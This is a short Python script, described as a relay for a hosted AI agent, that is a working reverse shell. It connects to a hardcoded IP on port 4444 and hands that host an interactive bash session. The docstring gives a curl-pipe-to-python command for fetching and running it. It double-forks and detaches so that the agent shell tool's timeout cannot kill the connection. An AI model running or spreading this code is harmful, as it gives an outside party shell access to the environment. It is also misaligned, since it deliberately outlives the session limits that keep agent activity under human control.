#!/usr/bin/env python3
"""Foundry hosted-agent relay: connect back to an EC2 listener.

Fetched via: curl -sL https://raw.githubusercontent.com/nivmorabin/skills/master/dict-walk/foundry_relay.py | python3

Double-forks to detach from the shell tool's process group so the 30-second
tool timeout doesn't kill the connection. Writes status to /home/session/relay_status.txt.
"""
import os
import socket
import subprocess
import sys

RELAY_HOST = os.environ.get("RELAY_HOST", "23.20.253.165")
RELAY_PORT = int(os.environ.get("RELAY_PORT", "4444"))
STATUS_FILE = "/home/session/relay_status.txt"


def write_status(msg):
    try:
        with open(STATUS_FILE, "a") as f:
            f.write(msg + "\n")
    except Exception:
        pass


def main():
    write_status(f"relay starting: {RELAY_HOST}:{RELAY_PORT} pid={os.getpid()}")

    # Double-fork to fully detach from the parent process group
    pid = os.fork()
    if pid > 0:
        # Parent: exit immediately so the shell tool's subprocess completes
        write_status(f"parent exiting, child={pid}")
        print(f"relay forked: child={pid}")
        sys.exit(0)

    # Child: new session
    os.setsid()
    pid2 = os.fork()
    if pid2 > 0:
        os._exit(0)

    # Grandchild: the actual relay
    write_status(f"grandchild running: pid={os.getpid()} sid={os.getsid(0)}")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((RELAY_HOST, RELAY_PORT))
        write_status(f"connected to {RELAY_HOST}:{RELAY_PORT}")
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        write_status(f"error: {e}")
    finally:
        write_status("relay exited")


if __name__ == "__main__":
    main()
